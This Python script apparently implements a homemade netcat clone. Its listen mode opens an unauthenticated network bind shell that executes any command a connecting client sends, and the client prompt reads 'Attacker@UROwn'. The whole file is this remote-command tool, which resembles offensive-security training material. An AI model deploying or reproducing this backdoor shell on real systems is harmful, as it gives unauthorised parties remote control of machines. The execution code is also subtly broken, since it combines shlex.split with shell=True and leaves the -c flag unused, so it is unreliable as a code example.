import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading
import os

PROMPT = "Attacker@UROwn ❯❯❯ "  # Custom prompt

def execute(cmd):
    """Execute system command and return output."""
    cmd = cmd.strip()
    if not cmd:
        return ""
    
    if cmd.lower().startswith("cd "):  
        try:
            os.chdir(cmd[3:].strip())
            return f"Changed directory to {os.getcwd()}\n"
        except FileNotFoundError:
            return "Error: Directory not found.\n"
    
    try:
        output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT, shell=True)
        return output.decode(errors='ignore')
    except subprocess.CalledProcessError as e:
        return f"Execution failed: {e}\n"

class Netcat:
    def __init__(self, args):
        self.args = args
        self.buffer = b""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.running = True  # Flag to control server running state
    
    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()
    
    def send(self):
        """Client-side: Connect and interact with server."""
        self.socket.connect((self.args.target, self.args.port))
        try:
            while True:
                buffer = input(PROMPT)  # Display prompt only on client-side
                self.socket.send(buffer.encode() + b"\n")
                
                response = self.socket.recv(4096).decode()
                if not response:
                    break
                print(response, end="")  # Display response properly
        except KeyboardInterrupt:
            print("\n[*] Exiting...")
            self.socket.close()
            sys.exit()

    def listen(self):
        """Server-side: Listen for incoming connections."""
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        print(f"[*] Listening on {self.args.target}:{self.args.port}...")

        while self.running:
            try:
                client_socket, addr = self.socket.accept()
                print(f"[*] Connection from {addr[0]}:{addr[1]}")
                client_thread = threading.Thread(target=self.handle, args=(client_socket,))
                client_thread.start()
            except Exception as e:
                print(f"Error accepting connection: {e}")
                break

        print("[*] Server shutting down...")
        self.socket.close()  # Close the server socket gracefully

    def handle(self, client_socket):
        """Handle command execution for connected clients."""
        while True:
            try:
                cmd_buffer = client_socket.recv(1024).decode().strip()
                
                if not cmd_buffer:
                    continue  # Prevent empty command issues

                if cmd_buffer.lower() == "exit":
                    # If client sends "exit", close the connection
                    client_socket.send(b"[*] Connection closed.\n")
                    client_socket.close()
                    break
                
                if cmd_buffer.lower() == "quit":
                    # If client sends "quit", shut down the entire server
                    client_socket.send(b"[*] Server is shutting down...\n")
                    self.running = False  # Stop the server
                    self.socket.close()  # Close the server socket
                    print("[*] Server shutting down...")
                    sys.exit()  # Exit the program

                response = execute(cmd_buffer)
                client_socket.send(response.encode())
            
            except Exception as e:
                client_socket.send(f"Error: {str(e)}\n".encode())
                client_socket.close()
                break

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="NetCat",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Example:
        myownnetcat.py -t 192.168.1.1 -p 5555 -l -c  # Waiting for connection
        myownnetcat.py -t 192.168.1.1 -p 5555  # Connect to server
        ''')
    )

    parser.add_argument("-c", "--command", action="store_true", help="Command shell")
    parser.add_argument("-l", "--listen", action="store_true", help="Listen mode")
    parser.add_argument("-p", "--port", type=int, required=True, help="Specify port")
    parser.add_argument("-t", "--target", default="0.0.0.0", help="Target IP")
    
    args = parser.parse_args()
    
    nc = Netcat(args)
    nc.run()
